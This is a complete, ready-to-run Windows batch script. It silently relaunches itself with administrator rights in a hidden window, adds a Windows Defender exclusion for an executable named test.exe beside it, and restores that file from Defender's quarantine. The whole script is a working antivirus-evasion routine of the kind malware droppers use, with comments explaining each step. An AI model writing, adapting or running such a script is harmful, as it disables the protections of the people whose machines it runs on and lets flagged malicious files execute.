@echo off
setlocal EnableExtensions
set "TARGET=%~dp0test.exe"
set "MPCMDRUN=%ProgramFiles%\Windows Defender\MpCmdRun.exe"

rem If already admin, skip to execution.
net session >nul 2>&1 && goto :do_work

rem Not admin: relaunch self as admin, hidden. 
rem `exit` (not exit /b) so a cmd /K host also closes.
powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
exit

:do_work
rem 1. Add the exclusion.
rem    -ErrorAction SilentlyContinue prevents errors if it already exists.
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%TARGET%' -ErrorAction SilentlyContinue"

rem 2. Attempt to restore from quarantine using MpCmdRun.
rem    Only -Restore and -FilePath are valid here. 
rem    If the file isn't in quarantine, this fails silently (non-zero exit, no crash).
if exist "%MPCMDRUN%" (
    "%MPCMDRUN%" -Restore -FilePath "%TARGET%"
)

exit